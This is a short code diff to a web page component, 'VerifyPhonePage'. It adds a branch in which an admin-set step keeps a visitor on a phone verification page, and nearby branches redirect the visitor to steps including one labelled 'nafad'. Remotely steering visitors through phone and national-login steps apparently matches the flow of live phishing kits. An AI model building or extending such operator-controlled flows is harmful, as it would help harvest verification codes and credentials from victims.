@@ -52,6 +52,9 @@ export default function VerifyPhonePage() {
           if (data.currentStep === "home") {
             console.log("[phone-info] Admin redirecting to home")
             window.location.href = "/"
+          } else if (data.currentStep === "phone") {
+            console.log("[phone-info] Admin wants visitor to stay on phone page")
+            // Already on phone page, do nothing
           } else if (data.currentStep === "_t6") {
             console.log("[phone-info] Admin redirecting to nafad")
             window.location.href = "/step4"
